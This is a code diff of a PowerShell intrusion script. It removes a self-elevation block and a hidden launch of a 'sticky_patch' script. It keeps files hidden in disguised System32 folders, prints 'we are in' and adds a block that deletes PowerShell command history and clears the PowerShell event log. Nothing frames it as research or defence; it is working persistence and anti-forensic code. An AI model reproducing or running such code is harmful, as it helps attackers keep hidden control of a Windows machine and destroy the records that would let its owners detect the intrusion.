@@ -1,11 +1,3 @@
-# Self-Elevate to Administrator
-$principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
-if (-not $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
-    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
-    exit
-}
-
-
 #  Define Target Paths
 $taskScriptPath    = "$env:windir\System32\Com\en-US"
 $logScriptPath     = "$env:windir\System32\Speech\Engines\TTS\en-US"
@@ -78,9 +70,20 @@ $Shortcut.WindowStyle = 7
 $Shortcut.Save()
 try { attrib +h $shortcutPath } catch { }
 
-
-# One-Time Execution: sticky_patch
-Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$oneTimeScriptPath\sticky_patch.ps1`""
-
-
 Write-Host "`n we are in, repeat we are in"
+
+try {
+    # Clear PSReadLine file history
+    $histFile = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+    if (Test-Path $histFile) {
+        Remove-Item $histFile -Force -ErrorAction SilentlyContinue
+    }
+
+    # Clear in-memory session history
+    Clear-History -ErrorAction SilentlyContinue
+
+    # Clear PowerShell event log
+    wevtutil cl "Windows PowerShell" 2>$null
+} catch {
+    # Ignore any errors during cleanup
+}
